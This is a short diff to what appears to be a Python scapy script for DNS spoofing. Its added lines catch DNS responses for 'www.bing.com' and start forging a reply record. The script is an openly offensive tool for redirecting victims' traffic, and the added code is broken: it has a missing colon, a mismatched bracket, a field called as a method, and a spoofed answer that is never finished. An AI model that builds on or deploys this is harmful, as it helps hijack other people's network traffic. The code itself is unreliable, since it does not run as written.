@@ -33,8 +33,14 @@ def flush_iptables():
 
 
 def process_packet(packet):
+    #TODO argparse for the website to spoof?
     scapy_packet = scapy.IP(packet.get_payload())
-    print(scapy_packet.show())
+    if scapy_packet.haslayer(scapy.DNSRR)
+        qname = scapy_packet[scapy.DNSQR].qname()
+        if "www.bing.com" in qname:
+            print('[+] Found website DNS request. Spoofing...']
+            answer = scapy.DNSRR(rrname=qname)
+
     packet.accept()
 
 
